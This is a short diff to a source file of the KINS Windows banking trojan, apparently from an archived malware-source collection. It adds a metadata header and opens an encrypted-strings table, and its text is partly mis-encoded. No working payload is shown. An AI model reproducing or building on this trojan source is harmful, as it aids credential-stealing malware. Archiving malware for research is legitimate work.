@@ -1,3 +1,14 @@
+/*
+  name      KINS
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 
 #include "defines.h"
@@ -7,7 +18,7 @@
 #include "..\common\mem.h"
 #include "..\common\crypt.h"
 
-//Список строк.
+//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
 static const CryptedStrings::STRINGINFO strings[] =
 {
 //STRINGS_DATA_BEGIN
